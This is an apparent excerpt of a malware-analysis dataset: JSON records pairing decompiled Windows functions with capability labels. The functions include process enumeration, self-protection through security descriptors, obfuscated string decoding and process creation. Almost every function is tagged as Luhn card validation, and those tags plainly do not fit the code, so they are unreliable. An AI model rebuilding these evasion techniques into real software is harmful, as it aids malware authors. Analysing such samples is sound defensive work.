        "decompiled_code": "\nuint fcn.0040a78b(uint param_1, uint param_2)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    \n    uVar2 = 0;\n    puVar1 = fcn.0040a66b(0x80000001, param_1, param_2, 0);\n    if (puVar1 != NULL) {\n        uVar2 = *puVar1;\n        fcn.0040af12();\n    }\n    return uVar2;\n}\n",
        "token_count": 112
    },
    "0040a7f8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040a7f8(uint32_t arg_8h)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    \n    uVar1 = *0x41bb18;\n    iVar2 = 3;\n    do {\n        if (*0x41bb18 * 0xea <= ((arg_8h ^ (uVar1 | arg_8h) + uVar1) & 0x8e)) {\n            *0x41bb18 = *0x41bb18 | 0x463a;\n        }\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    return *0x41bb18 & 0xffffff00 | *0x41bb38;\n}\n",
        "token_count": 169
    },
    "0040acc1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040acc1(uint param_1, uint param_2, uint param_3)\n\n{\n    fcn.0040a88f(param_1, param_2, param_3, 0);\n    return;\n}\n",
        "token_count": 53
    },
    "0040acd8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040acd8(uint param_1, uint param_2, uint param_3)\n\n{\n    *0x41bb18 = 0x395264;\n    fcn.0040a88f(param_1, param_2, param_3, 1);\n    return;\n}\n",
        "token_count": 67
    },
    "0040af58": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040af58(void)\n\n{\n    char cVar1;\n    uint in_EAX;\n    uint uVar2;\n    \n    cVar1 = fcn.0040acf9();\n    if (cVar1 != '\\0') {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        cVar1 = fcn.0040ad0b(in_EAX);\n        if (cVar1 != '\\0') {\n            sub.ntdll.dll_memset();\n            fcn.0040af12();\n        }\n        (*_sym.imp.KERNEL32.dll_SetLastError)(uVar2);\n    }\n    return;\n}\n",
        "token_count": 140
    },
    "0040af95": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040af95(uint s2, uint n)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00415eec(0x419190, 0xc);\n    iVar1 = fcn.0040ae05(0);\n    *(unaff_EBP + -0x1c) = iVar1;\n    if (iVar1 != 0) {\n        *(unaff_EBP + -4) = 0;\n        sub.ntdll.dll_memcpy(iVar1, *(unaff_EBP + 8), *(unaff_EBP + 0xc));\n        *(unaff_EBP + -4) = 0xffffffff;\n    }\n    fcn.00415f27();\n    return;\n}\n",
        "token_count": 197
    },
    "0040b824": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040b824(uint arg_8h, uint32_t arg_ch, int32_t arg_10h, uint arg_14h, int32_t arg_18h)\n\n{\n    char cVar1;\n    uint16_t uVar2;\n    uint16_t uVar3;\n    uint32_t uVar4;\n    uint var_140h;\n    uint var_38h;\n    uint var_22h;\n    uint var_4h;\n    \n    uVar2 = fcn.0040b00a(0xc18);\n    uVar3 = fcn.0040b186(*0x41b036);\n    if (((uVar2 & 0x43) == uVar3) && (-1 < uVar3)) {\n        fcn.0040b261(0x65);\n    }\n    uVar4 = fcn.0040afe7();\n    *0x41e3fd = uVar4 != *0x41e3fd;\n    cVar1 = fcn.0040f84a(arg_8h, arg_ch & 0xffff);\n    if (cVar1 == '\\0') {\n        fcn.0040b00a(0x2887);\n    }\n    else {\n        fcn.0040b186(99);\n        cVar1 = fcn.0040f84a(arg_10h, arg_14h);\n        if (cVar1 == '\\0') {\n            var_38h._0_2_ = 0;\n            sub.ntdll.dll_memset(&var_38h + 2, 0, 0x32);\n        }\n        else {\n            if (arg_18h == 0) {\n                *0x41e3fd = 0;\n                fcn.0040afe7();\n                arg_18h = arg_10h;\n            }\n            fcn.0040b261(0x1f);\n            cVar1 = fcn.0040f871(arg_18h, arg_14h);\n            if (cVar1 == '\\0') {\n                fcn.0040b186(0x61);\n                goto code_r0x0040b974;\n            }\n            *0x41e3fd = *0x41e3fd >> (*0x41b13c + 0xbU & 0x1f) != 0;\n            fcn.0040b31b(arg_8h, arg_ch, &var_140h);\n            fcn.0040b00a(*0x41b13c);\n            fcn.0040b5b8(arg_10h, arg_18h, arg_14h);\n        }\n        fcn.0040afe7();\n    }\ncode_r0x0040b974:\n    fcn.0040b00a(0x4987);\n    return;\n}\n",
        "token_count": 636
    },
    "0040b98a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0040b98a(uint param_1)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    int16_t iVar3;\n    int32_t iVar4;\n    uint8_t extraout_DL;\n    int32_t arg_18h;\n    uint32_t uVar5;\n    bool bVar6;\n    \n    *0x41e3fd = *0x41e3fd != (*0x41b13c & 0xb6);\n    arg_18h = 0;\n    iVar4 = fcn.0040afe7();\n    *0x41e3fd = (iVar4 * *0x41e3fd != 0) >> (extraout_DL & 0x1f) != 0;\n    cVar1 = fcn.0040f84a(param_1, 6);\n    if (cVar1 == '\\0') {\n        bVar6 = (*0x41e3fd & *0x41b13c) == 0;\n    }\n    else {\n        fcn.0040b074(0x251df75, 0);\n        cVar1 = fcn.0040f84a(0x41f004, 0x19000);\n        if (cVar1 == '\\0') {\n            iVar4 = fcn.0040b2fe();\n            bVar6 = iVar4 == 0;\n        }\n        else {\n            cVar1 = fcn.0040b2fe();\n            *0x41e3fd = (*0x41e3fd & cVar1 * -4) != 0;\n            arg_18h = fcn.0040ae05(0);\n            fcn.0040b2fe();\n            if (arg_18h != 0) {\n                bVar6 = (*0x41e3fd & *0x41b604 + 6U) != 0;\n                uVar5 = bVar6;\n                if (((uVar5 < *0x41b604) || ((uVar5 < *0x41b13c && (0xd5 < *0x41b604)))) &&\n                   (uVar5 <= (*0x41b604 | 0x3a))) {\n                    bVar6 = (*0x41b13c | uVar5) != 0;\n                }\n                bVar6 = (bVar6 != *0x41b13c) >> (*0x41b604 << bVar6 & 0x1f) != 0;\n                *0x41e3fd = bVar6;\n                cVar1 = fcn.0040b074(*0x41bb08, *0x41bb0c);\n                if ((*0x41b13c <= cVar1 >> 7) || (!bVar6)) {\n                    iVar3 = fcn.0040b186(0x51);\n                    if (iVar3 < 0) {\n                        uVar2 = fcn.0040b186(*0x41b036);\n                        if (*0x41e3fd == (uVar2 & 0xb4)) {\n                            fcn.0040b074(0xc403a6, 0);\n                        }\n                    }\n                }\n                fcn.0040b824(param_1, 6, 0x41f004, 0x19000, arg_18h);\n                goto code_r0x0040bb29;\n            }\n            bVar6 = *0x41b13c == 0;\n        }\n    }\n    *0x41e3fd = !bVar6;\ncode_r0x0040bb29:\n    fcn.0040b261(0xe);\n    return arg_18h;\n}\n",
        "token_count": 818
    },
    "0040be10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040be10(int32_t *arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t iStack12;\n    \n    iStack12 = 0;\n    iVar1 = fcn.00410b60(0, arg_10h);\n    if (iVar1 != 0) {\n        iVar1 = fcn.0040ae72();\n        if (iVar1 != 0) {\n            iStack12 = fcn.00410b60(iVar1 + arg_ch, arg_10h);\n            if (iStack12 != 0) {\n                iStack12 = iStack12 + arg_ch;\n                *arg_8h = iVar1;\n            }\n        }\n    }\n    return iStack12;\n}\n",
        "token_count": 186
    },
    "0040beef": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040beef(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00415eec(0x419180, 0x10);\n    cVar1 = fcn.0040f871(extraout_ECX, 4);\n    if (cVar1 != '\\0') {\n        *(unaff_EBP + -0x20) = 0;\n        *(unaff_EBP + -4) = 0;\n        *(unaff_EBP + -0x1c) = 0;\n        iVar2 = fcn.0040bdb8(unaff_EBP + -0x1c, *(unaff_EBP + 8), unaff_EBP + 0xc);\n        *(unaff_EBP + -0x20) = iVar2;\n        if (iVar2 != 0) {\n            *extraout_ECX = *(unaff_EBP + -0x1c);\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n    }\n    fcn.00415f27();\n    return;\n}\n",
        "token_count": 303
    },
    "0040bf4f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040bf4f(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00415eec(0x419170, 0x10);\n    cVar1 = fcn.0040f871(extraout_ECX, 4);\n    if (cVar1 != '\\0') {\n        *(unaff_EBP + -0x20) = 0;\n        *(unaff_EBP + -4) = 0;\n        *(unaff_EBP + -0x1c) = 0;\n        iVar2 = fcn.0040be10(unaff_EBP + -0x1c, 0, *(unaff_EBP + 8), unaff_EBP + 0xc);\n        *(unaff_EBP + -0x20) = iVar2;\n        if (iVar2 != 0) {\n            *extraout_ECX = *(unaff_EBP + -0x1c);\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n    }\n    fcn.00415f27();\n    return;\n}\n",
        "token_count": 307
    },
    "0040bfb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040bfb0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint *arg_8h_00;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00415eec(0x419160, 0xc);\n    cVar1 = fcn.0040f871(arg_8h_00, 4);\n    if (cVar1 != '\\0') {\n        *(unaff_EBP + -0x1c) = 0;\n        *(unaff_EBP + -4) = 0;\n        if (*(unaff_EBP + 8) == 0) {\n            uVar2 = (*_sym.imp.KERNEL32.dll_lstrlenA)(*arg_8h_00);\n            *(unaff_EBP + 8) = uVar2;\n        }\n        uVar2 = fcn.0040be10(arg_8h_00, *(unaff_EBP + 8), *(unaff_EBP + 0xc), unaff_EBP + 0x10);\n        *(unaff_EBP + -0x1c) = uVar2;\n        *(unaff_EBP + -4) = 0xffffffff;\n    }\n    fcn.00415f27();\n    return;\n}\n",
        "token_count": 325
    },
    "0040c014": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040c014(uint lpString1, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t unaff_EBP;\n    uint lpString2;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00415eec(0x419150, 0x10);\n    iVar1 = *(unaff_EBP + 0xc);\n    *(unaff_EBP + -0x1c) = 0;\n    *(unaff_EBP + -4) = 0;\n    if (iVar1 == 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_lstrlenW)(*(unaff_EBP + 8));\n    }\n    *(unaff_EBP + -0x20) = 0;\n    iVar2 = fcn.0040bdb8(unaff_EBP + -0x20, *(unaff_EBP + 0x10), unaff_EBP + 0x14);\n    *(unaff_EBP + -0x1c) = iVar2;\n    if (iVar2 != 0) {\n        (*_sym.imp.KERNEL32.dll_lstrcatW)(*(unaff_EBP + 8), *(unaff_EBP + -0x20));\n        fcn.0040af12();\n    }\n    *(unaff_EBP + -0x1c) = *(unaff_EBP + -0x1c) + iVar1;\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.00415f27();\n    return;\n}\n",
        "token_count": 381
    },
    "0040c082": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040c082(uint lpString2)\n\n{\n    code *pcVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00415eec(0x419140, 0x10);\n    cVar2 = fcn.0040f871(extraout_ECX, 4);\n    if (cVar2 != '\\0') {\n        *(unaff_EBP + -0x1c) = 0;\n        *(unaff_EBP + -4) = 0;\n        pcVar1 = _sym.imp.KERNEL32.dll_lstrlenW;\n        iVar3 = (*_sym.imp.KERNEL32.dll_lstrlenW)(*(unaff_EBP + 8));\n        iVar4 = (*pcVar1)(*extraout_ECX);\n        *(unaff_EBP + -0x20) = iVar4;\n        *(unaff_EBP + -0x1c) = iVar4 + iVar3;\n        iVar4 = fcn.0040ae72();\n        *extraout_ECX = iVar4;\n        if (iVar4 == 0) {\n            *(unaff_EBP + -0x1c) = 0;\n        }\n        else {\n            (*_sym.imp.KERNEL32.dll_lstrcpynW)(iVar4 + *(unaff_EBP + -0x20) * 2, *(unaff_EBP + 8), iVar3 + 1);\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n    }\n    fcn.00415f27();\n    return;\n}\n",
        "token_count": 406
    },
    "0040c306": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0040c306(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar3 = 0x8000;\n    while( true ) {\n        iVar1 = fcn.0040ae05(0);\n        if (iVar1 == 0) {\n            return 0;\n        }\n        iVar2 = (*_sym.imp.ntdll.dll_ZwQuerySystemInformation)(5, iVar1, iVar3, 0);\n        if (iVar2 != -0x3ffffffc) break;\n        fcn.0040af12();\n        iVar3 = iVar3 * 2;\n    }\n    if (-1 < iVar2) {\n        return iVar1;\n    }\n    fcn.0040af12();\n    return 0;\n}\n",
        "token_count": 178
    },
    "0040c349": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040c349(uint param_1)\n\n{\n    char cVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    \n    cVar1 = fcn.0040f898(param_1);\n    if ((cVar1 != '\\0') && (piVar2 = fcn.0040c306(),  piVar2 != NULL)) {\n        while( true ) {\n            iVar3 = (*_sym.imp.KERNEL32.dll_lstrcmpiW)(param_1, piVar2[0xf]);\n            if (iVar3 == 0) {\n                fcn.0040c2c9(piVar2[0x11]);\n            }\n            if (*piVar2 == 0) break;\n            piVar2 = piVar2 + *piVar2;\n        }\n        fcn.0040af12();\n    }\n    return;\n}\n",
        "token_count": 193
    },
    "0040c439": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040c439(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint var_58h;\n    uint var_49h;\n    uint lpBuffer;\n    uint nSize;\n    uint var_4h;\n    \n    cVar1 = fcn.0040f8eb(arg_8h);\n    if ((cVar1 == '\\0') || (cVar1 = fcn.0040f871(arg_ch, 0x28),  cVar1 == '\\0')) {\n        iVar2 = 0;\n    }\n    else {\n        iVar2 = 0;\n        nSize = 0x10;\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetComputerNameA)(&lpBuffer, &nSize);\n        if (iVar3 != 0) {\n            uVar4 = fcn.0040a88f(0x418c10, 5, 0x27e55d8c, 0);\n            iVar3 = fcn.0040bf4f(uVar4, &lpBuffer);\n            if (iVar3 != 0) {\n                iVar2 = fcn.00410e70(var_4h, &var_58h);\n                if (iVar2 != 0) {\n                    uVar4 = fcn.0040a88f(0x418c18, 0x32, 0x3dd97771, 0);\n                    fcn.0040beb2(arg_ch, uVar4, var_58h);\n                }\n                fcn.0040af12();\n            }\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 380
    },
    "0040c52a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040c52a(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint var_68h;\n    \n    cVar1 = fcn.0040f898(arg_8h);\n    if ((cVar1 == '\\0') || (cVar1 = fcn.0040f871(arg_ch, 0x50),  cVar1 == '\\0')) {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = 0;\n        iVar3 = fcn.0040d55a(arg_8h);\n        if (iVar3 != 0) {\n            uVar2 = fcn.0040c439(iVar3, &var_68h);\n            if (uVar2 != 0) {\n                iVar3 = fcn.0040d5e4(&var_68h, 0, arg_ch);\n                uVar2 = iVar3 != 0;\n            }\n            fcn.0040af12();\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 250
    },
    "0040c63e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0040c63e(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint var_ch;\n    uint SecurityDescriptor;\n    uint uStack8;\n    \n    uVar4 = 0;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n    iVar2 = fcn.0040c210(0x1fffff, uVar1);\n    if (iVar2 != 0) {\n        SecurityDescriptor = 0;\n        uStack8 = 0;\n        uVar1 = fcn.0040acd8(0x418c4c, 3, 0x8590aa2b, uVar1, 1, &SecurityDescriptor, 0);\n        iVar3 = (*_sym.imp.ADVAPI32.dll_ConvertStringSecurityDescriptorToSecurityDescriptorW)(uVar1);\n        if (iVar3 != 0) {\n            iVar2 = (*_sym.imp.ADVAPI32.dll_SetKernelObjectSecurity)(iVar2, 4, SecurityDescriptor);\n            if (iVar2 == 0) {\n                uVar4 = 1;\n            }\n        }\n        fcn.0040c13c();\n    }\n    return uVar4;\n}\n",
        "token_count": 280
    },
    "0040c6b4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create process on Windows"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040c6b4(int32_t lpApplicationName, int32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint var_58h;\n    uint s;\n    uint var_2ch;\n    uint var_28h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint uStack8;\n    \n    cVar1 = fcn.0040f898(lpApplicationName);\n    if (cVar1 == '\\0') {\n        lpApplicationName = 0;\n    }\n    cVar1 = fcn.0040f898(arg_ch);\n    if (cVar1 == '\\0') {\n        arg_ch = 0;\n    }\n    if ((lpApplicationName == 0) && (arg_ch == 0)) {\n        uVar3 = 0;\n    }\n    else {\n        fcn.0040f898(0);\n        sub.ntdll.dll_memset(&s, 0, 0x40);\n        var_10h = 0;\n        var_ch = 0;\n        var_8h = 0;\n        uStack8 = 0;\n        var_28h._0_2_ = 0;\n        var_58h = 0x44;\n        var_2ch = 1;\n        iVar2 = (*_sym.imp.KERNEL32.dll_CreateProcessW)(lpApplicationName, arg_ch, 0, 0, 0, 0, 0, 0, &var_58h, &var_10h)\n        ;\n        uVar3 = 0;\n        if (iVar2 != 0) {\n            fcn.0040c13c();\n            fcn.0040c13c();\n            uVar3 = var_8h;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 421
    },
    "0040c7c4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "create or open section object"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040c7c4(int16_t *psz1)\n\n{\n    int16_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int16_t iVar4;\n    int16_t *piVar5;\n    uint uVar6;\n    uint uVar7;\n    uint var_30h;\n    int32_t var_2ch;\n    uint *var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int16_t *var_14h;\n    uint var_10h;\n    int16_t *var_ch;\n    uint var_8h;\n    \n    uVar7 = 0xb;\n    uVar2 = fcn.0040acd8(0x418c60, 0xb, 0x75cc28f7);\n    iVar3 = (*_sym.imp.SHLWAPI.dll_StrCmpNIW)(psz1, uVar2, uVar7);\n    if (iVar3 == 0) {\n        var_8h = 1;\n    }\n    else {\n        var_8h = 0;\n        if (*0x41e818 == 0) {\n            iVar3 = fcn.0040c40d();\n            if (iVar3 == 0) {\n                uVar6 = 0x3b6dcd7a;\n                uVar7 = 10;\n                uVar2 = 0x418c7c;\n            }\n            else {\n                uVar6 = 0x76e5ba3c;\n                uVar7 = 0xc;\n                uVar2 = 0x418c6c;\n            }\n            var_ch = fcn.0040acd8(uVar2, uVar7, uVar6);\n            if (var_ch == NULL) {\n                iVar4 = 0;\n                iVar1 = 0;\n            }\n            else {\n                piVar5 = var_ch;\n                do {\n                    iVar1 = *piVar5;\n                    piVar5 = piVar5 + 1;\n                } while (iVar1 != 0);\n                iVar1 = (piVar5 - (var_ch + 1) >> 1) * 2;\n                iVar4 = iVar1 + 2;\n            }\n            var_28h = &var_10h;\n            var_10h = CONCAT22(iVar4, iVar1);\n            var_30h = 0x18;\n            var_2ch = 0;\n            var_24h = 0x240;\n            var_20h = 0;\n            var_1ch = 0;\n            (*_sym.imp.ntdll.dll_ZwOpenDirectoryObject)(0x41e818, 1, &var_30h);\n            if (*0x41e818 == 0) {\n                return var_8h;\n            }\n        }\n        if (psz1 == NULL) {\n            iVar4 = 0;\n            iVar1 = 0;\n        }\n        else {\n            piVar5 = psz1;\n            do {\n                iVar1 = *piVar5;\n                piVar5 = piVar5 + 1;\n            } while (iVar1 != 0);\n            iVar1 = (piVar5 - (psz1 + 1) >> 1) * 2;\n            iVar4 = iVar1 + 2;\n        }\n        var_2ch = *0x41e818;\n        var_28h = &var_18h;\n        var_18h = CONCAT22(iVar4, iVar1);\n        var_14h = psz1;\n        var_30h = 0x18;\n        var_24h = 0x240;\n        var_20h = 0;\n        var_1ch = 0;\n        iVar3 = (*_sym.imp.ntdll.dll_ZwOpenSection)(&var_ch, 0x20000, &var_30h);\n        if (-1 < iVar3) {\n            var_8h = 1;\n            (*_sym.imp.ntdll.dll_ZwClose)(var_ch);\n        }\n    }\n    return var_8h;\n}\n",
        "token_count": 905
    },
    "0040c920": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.0040c920(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    uint extraout_ECX;\n    uint unaff_ESI;\n    bool bVar4;\n    \n    bVar4 = false;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n    iVar2 = fcn.0040c397(uVar1);\n    if (iVar2 != 0) {\n        uVar1 = fcn.0040a88f(0x418c88, 0x1e, 0x819a3132, 0);\n        uVar1 = fcn.0040acd8(0x418c50, 0xc, 0xaac1731b, extraout_ECX, uVar1);\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(uVar1);\n        pcVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n        if (pcVar3 != NULL) {\n            iVar2 = (*pcVar3)(unaff_ESI);\n            bVar4 = iVar2 != 0;\n        }\n    }\n    return bVar4;\n}\n",
        "token_count": 267
    },
    "0040ca20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040ca20(int16_t *arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int16_t *piVar4;\n    uint uVar5;\n    uint lpPathName;\n    uint lpTempFileName;\n    \n    uVar5 = 0;\n    fcn.0040f898(0);\n    cVar1 = fcn.0040f898(arg_8h);\n    if (cVar1 == '\\0') {\n        arg_8h = NULL;\n    }\n    iVar2 = (*_sym.imp.KERNEL32.dll_GetTempPathW)(0x104, &lpPathName);\n    if (iVar2 != 0) {\n        uVar3 = fcn.0040acd8(0x418ca8, 3, 0xb1a3597d);\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetTempFileNameW)(&lpPathName, uVar3, 0, &lpTempFileName);\n        if (iVar2 != 0) {\n            fcn.0040cb5b();\n            if (arg_8h != NULL) {\n                iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenW)(&lpTempFileName);\n                for (piVar4 = &lpTempFileName + iVar2 * 2; *piVar4 != 0x2e; piVar4 = piVar4 + -1) {\n                }\n                if (*arg_8h != 0x2e) {\n                    piVar4 = piVar4 + 1;\n                }\n                (*_sym.imp.KERNEL32.dll_lstrcpyW)(piVar4, arg_8h);\n            }\n            uVar5 = fcn.0040bd22(&lpTempFileName);\n        }\n    }\n    return uVar5;\n}\n",
        "token_count": 402
    },
    "0040cc16": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040cc16(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int16_t *piVar4;\n    \n    cVar1 = fcn.0040f898(param_1);\n    if (cVar1 != '\\0') {\n        iVar2 = (*_sym.imp.SHLWAPI.dll_PathFindFileNameW)(param_1);\n        iVar3 = (*_sym.imp.KERNEL32.dll_lstrlenW)(iVar2);\n        piVar4 = iVar2 + iVar3 * 2;\n        for (; (*piVar4 != 0x2e && (iVar3 != 0)); iVar3 = iVar3 + -1) {\n            piVar4 = piVar4 + -1;\n        }\n        iVar3 = iVar3 * 2;\n        cVar1 = fcn.0040f871(param_2, iVar3);\n        if (cVar1 != '\\0') {\n            sub.ntdll.dll_memcpy(param_2, iVar2, iVar3);\n            *(iVar3 + param_2) = 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 256
    },
    "0040cc7b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_44h\n// WARNING: Variable defined which should be unmapped: lpdwHandle\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.0040cc7b(uint lptstrFilename, int32_t arg_ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint unaff_EDI;\n    uint var_1450h;\n    uint uStackY88;\n    uint uStackY84;\n    uint uStackY80;\n    uint32_t var_44h;\n    char *lpdwHandle;\n    uint *var_3ch;\n    char *var_38h;\n    int32_t var_34h;\n    uint var_30h;\n    uint *var_2ch;\n    uint *var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint *var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    uint16_t *var_4h;\n    \n    var_4h = 0x40cc88;\n    sub.ntdll.dll__chkstk();\n    var_10h = &fcn.0040cc7b::lpdwHandle;\n    var_14h = lptstrFilename;\n    uVar4 = 0;\n    var_18h = 0x40cc9a;\n    var_ch = unaff_EDI;\n    iVar2 = (*_sym.imp.VERSION.dll_GetFileVersionInfoSizeW)();\n    if (iVar2 != 0) {\n        var_18h = 0;\n        var_1ch = 0x40ccaa;\n        iVar3 = fcn.0040ae05();\n        if (iVar3 != 0) {\n            var_20h = 0;\n            var_24h = lptstrFilename;\n            var_28h = 0x40ccc1;\n            var_1ch = iVar2;\n            var_18h = iVar3;\n            (*_sym.imp.VERSION.dll_GetFileVersionInfoW)();\n            var_28h = &fcn.0040cc7b::var_8h;\n            var_2ch = &fcn.0040cc7b::var_4h;\n            var_30h = 0x2b37c760;\n            var_34h = 0x18;\n            var_38h = str.sq_bp;\n            var_4h = NULL;\n            var_8h = 0;\n            var_3ch = 0x40cce0;\n            var_30h = fcn.0040acd8();\n            